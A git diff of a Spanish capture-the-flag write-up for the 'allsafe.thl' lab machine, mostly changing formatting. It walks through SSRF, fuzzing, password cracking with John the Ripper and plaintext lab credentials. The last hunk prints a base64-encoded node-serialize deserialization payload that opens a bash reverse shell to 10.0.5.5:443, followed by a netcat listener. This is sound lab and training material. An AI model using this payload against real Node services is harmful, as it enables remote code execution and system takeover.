@@ -37,7 +37,7 @@ Si revisamo el código fuente, observamos que se está aplicando virtual hosting
 
 ![source_code_80](screenshots/source-code-80.png)
 
-Por lo tanto, vamos a modificar nuestro archivo `/etc/hosts` y añadirle el dominio de `allsafe.thl` para que nuestro navegador lo puede interpretar.
+Por lo tanto, vamos a modificar nuestro archivo **/etc/hosts** y añadirle el dominio de **allsafe.thl** para que nuestro navegador lo puede interpretar.
 
 ![virtual_hosting](screenshots/virtual_hosting.png)
 
@@ -49,35 +49,35 @@ Revisando la web encontramos los siguientes subdirectorios:
     - our-team.php  
     - contact.php  
 
-Aplicando Fuzzing con la herramienta `gobuster` no encontramos nada interesante. Por lo tanto, vamos a revisar los subdirectorios que tenemos.
+Aplicando Fuzzing con la herramienta **gobuster** no encontramos nada interesante. Por lo tanto, vamos a revisar los subdirectorios que tenemos.
 
-En our-team.php aparecen los nombres, fotos y funciones de los miembros de la empresa, lo cual nos puede dar pistas sobre algún nombre de usuario, además hay una foto que nos llama mucho la atención, ya que se puede observar una credencial en ella.
+En **our-team.php** aparecen los nombres, fotos y funciones de los miembros de la empresa, lo cual nos puede dar pistas sobre algún nombre de usuario, además hay una foto que nos llama mucho la atención, ya que se puede observar una credencial en ella.
 
 ![parker_image](screenshots/parker_image.png)
 
-En contact.php tenemos un formulario de contacto con los campos nombre, email, sitio web y mensaje, si enviamos datos recibimos el mensaje "Enviando con exito!".
+En **contact.php** tenemos un formulario de contacto con los campos nombre, email, sitio web y mensaje, si enviamos datos recibimos el mensaje "Enviando con exito!".
 
-Vamos a revisar el formulario. Tras varias pruebas, al intentar realizar un SSRF en el campo sitio web, para ver si podíamos apuntar a recursos internos de la máquina, obtenemos un mensaje diferente, `123456Seven`, al introducir `http://localhost` en sitio web.
+Vamos a revisar el formulario. Tras varias pruebas, al intentar realizar un SSRF en el campo sitio web, para ver si podíamos apuntar a recursos internos de la máquina, obtenemos un mensaje diferente, **123456Seven**, al introducir `http://localhost` en sitio web.
 
 ![contact-form](screenshots/contact-form.png)
 
 Parece ser una contraseña. Ya que tenemos los nombres de los miembros del equipo y esta contraseña, podemos intentar ingresar por alguno de los dos puertos de ssh, pero obviamente no iba a ser tan fácil.
 
-Ya hemos revisado subdirectorios sin éxito, así que vamos a utilizar la herramienta `wfuzz` para buscar subdominios.
+Ya hemos revisado subdirectorios sin éxito, así que vamos a utilizar la herramienta **wfuzz** para buscar subdominios.
 
 ![fuzzing_subdomain](screenshots/fuzzing-subdomain.png)
 
-Y encontramos un subdomnio `intranet`. Ahora tenemos que añadirlo al `/etc/hosts` para poder tener acceso a él desde el navegador.
+Y encontramos un subdomnio **intranet**. Ahora tenemos que añadirlo al **/etc/hosts** para poder tener acceso a él desde el navegador.
 
 ![virtual_hosting2](screenshots/virtual_hosting2.png)
 
-Si accedemos a `intranet.allsafe.thl`, vemos un panel de login, en el cual hay que proporcionar un ID de empleado y una contraseña, los cuales ya hemos obtenido anteriormente.
+Si accedemos a **intranet.allsafe.thl**, vemos un panel de login, en el cual hay que proporcionar un ID de empleado y una contraseña, los cuales ya hemos obtenido anteriormente.
 
-Pero antes de probar las credenciales, vamos a buscar subdirectorios con la herramienta `wfuzz` en esta nueva web.
+Pero antes de probar las credenciales, vamos a buscar subdirectorios con la herramienta **wfuzz** en esta nueva web.
 
 ![fuzzing-intranet](screenshots/fuzzing-intranet.png)
 
-El más interesante es el subdirectorio `process`, si accedemos a él vemos:
+El más interesante es el subdirectorio **process**, si accedemos a él vemos:
 
 ![process-intranet](screenshots/process-intranet.png)
 
@@ -95,7 +95,7 @@ Eso nos indica que si en esta aplicación podemos generar estos documentos, tene
 
 ## 🔥 Explotación
 
-Retornando al panel de login, usamos el ID del empleado parker que habíamos obtenido de la imagen y lo ponemos con el formato que se nos indica `0-477-9990` e introducimos la contraseña que obtenimos en el formulario de contacto, `123456Seven`
+Retornando al panel de login, usamos el ID del empleado parker que habíamos obtenido de la imagen y lo ponemos con el formato que se nos indica **0-477-9990** e introducimos la contraseña que obtenimos en el formulario de contacto, **123456Seven**
 
 ![login](screenshots/login.png)
 
@@ -127,7 +127,7 @@ Usando el comando `hostname -I` vemos que estamos dentro de un contenedor con la
 
 ### 🧗 Escalada de Privilegios
 
-Ejecutamos el comando `env` para ver las variables de entorno y observamos que nuestro usuario tiene configurado un directiorio para el servicio mail en `/var/mail/parker`. Si lo revisamos, encontramos un archivo con información muy útil.
+Ejecutamos el comando `env` para ver las variables de entorno y observamos que nuestro usuario tiene configurado un directiorio para el servicio mail en **/var/mail/parker**. Si lo revisamos, encontramos un archivo con información muy útil.
 
 ![mail-parker](screenshots/mail-parker.png)
 
@@ -137,9 +137,9 @@ Esta clave está en formato hexadecimal, así que usamos xxd para pasarla a stri
 echo '6D7033386E71556654416130494D314F70306157' | xxd -r -p
 ```
 
-Obtenemos --> mp38nqUfTAa0IM1Op0aW
+Obtenemos --> **mp38nqUfTAa0IM1Op0aW**
 
-La cual es la contraseña del usuario goddard, así que la utilizamos para convertirnos en goddard.
+La cual es la contraseña del usuario goddard, así que la utilizamos para convertirnos en **goddard**.
 
 Una vez como el usuario goddard, revisamos sus permisos sudoers.
 
@@ -163,15 +163,18 @@ cp secrets.psafe3 /var/www/allsafe/
 
 Accedemos con el navegador a allsafe.thl/secrets.psafe3 y lo descargamos.
 
-Este archivo es una base de datos cifrada, la cual necesita contraseña para poder acceder a ella, así que vamos a utilizar la herramienta `John the Ripper` y una versión con las primeras 5000 contraseñas del diccionario rockyou que llamaremos minirock.
+Este archivo es una base de datos cifrada, la cual necesita contraseña para poder acceder a ella, así que vamos a utilizar la herramienta **John the Ripper** y una versión con las primeras 5000 contraseñas del diccionario rockyou que llamaremos **minirock**.
 
-Primero, usamos `pwsafe2john secrets.psafe3 > hash`
+Primero, usamos:
+```bash
+pwsafe2john secrets.psafe3 > hash
+```
 
 Ahora intentamos romper esta hash con john y el minirock.
 
 ![psafe-passw](screenshots/psafe-passw.png)
 
-Abrimos el archivo secrets.psafe3 con `pwsafe` e introducimos la contraseña `rockandroll`.
+Abrimos el archivo secrets.psafe3 con **pwsafe** e introducimos la contraseña **rockandroll**
 
 ![cisco_passw](screenshots/cisco_passw.png)
 
@@ -179,13 +182,13 @@ Nos interesa el usuario cisco y su clave, para obtener la contraseña hacemos un
 
 ## 🔑 Acceso SSH a la máquina
 
-Accedemos al servicio de ssh del puerto 22 con las credenciales `cisco:sMpam!dE#8@$$1P%bnV@fFxdqjFFG#`
+Accedemos al servicio de ssh del puerto 22 con las credenciales **cisco:sMpam!dE#8@$$1P%bnV@fFxdqjFFG#**
 
 Una vez dentro ya tenemos la primera flag.
 
 ![user_flag](screenshots/user_flag.png)
 
-En el directorio /home/cisco vemos los archivos `.unknown` y `darkarmy.bin`.
+En el directorio /home/cisco vemos los archivos **.unknown** y **darkarmy.bin**.
 
 El contenido del archivo darkarmy.bin está en hexadecimal, usamos xxd para pasarlo a string. 
 
@@ -231,17 +234,17 @@ Ahora accedemos con el navegador a nuestro localhost por el puerto 3000
 
 Como se ha indicado en el mensaje del archivo .unknown, debemos acceder a la sala dark-ops, así que probamos con el usuario cisco y la contraseña que había en darkarmy.bin, pero no funciona.
 
-Tras revisar el sistema en busca de algún archivo con credenciales, encontramos este archivo en /var/log cuyo propietario es root pero podemos leer.
+Tras revisar el sistema en busca de algún archivo con credenciales, encontramos este archivo en **/var/log** cuyo propietario es root pero podemos leer.
 
 ![var-log](screenshots/var-log.png)
 
 ![app-log](screenshots/app-log.png)
 
-Probamos con la contraseña `DLFJYxLLSzp1x5Ttpsffpg2awuJT5K`, junto con el usuario `cisco` y la sala `dark-ops` en el servicio de node y conseguimos conectarnos.
+Probamos con la contraseña **DLFJYxLLSzp1x5Ttpsffpg2awuJT5K**, junto con el usuario **cisco** y la sala **dark-ops** en el servicio de node y conseguimos conectarnos.
 
 ![server-node](screenshots/server-node.png)
 
-Tras mucho rato revisando la conversación, el código fuente, buscando subdirectorios, intentos de ejecutar comandos con el chat, intentar acceder como el usuario shadow que aparece en los logs,... y no obtener nada, revisamos la cookie de sesión `eyJ1c2VybmFtZSI6ImNpc2NvIn0%3D`.
+Tras mucho rato revisando la conversación, el código fuente, buscando subdirectorios, intentos de ejecutar comandos con el chat, intentar acceder como el usuario shadow que aparece en los logs,... y no obtener nada, revisamos la cookie de sesión **eyJ1c2VybmFtZSI6ImNpc2NvIn0%3D**
 
 ![cookie](screenshots/cookie.png)
 
@@ -251,7 +254,7 @@ Podemos ver como está urlencodeada, así que la decodificamos usando la web de 
 echo 'eyJ1c2VybmFtZSI6ImNpc2NvIn0=' | base64 -d 
 ```
 
-Obtenemos --> {"username":"cisco"}
+Obtenemos --> **{"username":"cisco"}**
 
 Este objeto se deserializa por el servidor de node para comprobar el usuario, así que vamos a intentar un Ataque de Deserialización con una IIFE.
 
@@ -274,9 +277,9 @@ cat payload | base64 -w0
 ```
 
 El resultado es este --> 
-`eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMC41LjUvNDQzIDA+JjEnXCIsIGZ1bmN0aW9uKGVycm9yLHN0ZG91dCxzdGRlcnIpe30pfSgpIn0K`
+**eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcImJhc2ggLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMC41LjUvNDQzIDA+JjEnXCIsIGZ1bmN0aW9uKGVycm9yLHN0ZG91dCxzdGRlcnIpe30pfSgpIn0K**
 
-Ahora nos ponemos en escucha con `netcat` en el puerto 443. 
+Ahora nos ponemos en escucha con **netcat** en el puerto 443. 
 ```bash
 nc -nlvp 443
 ```
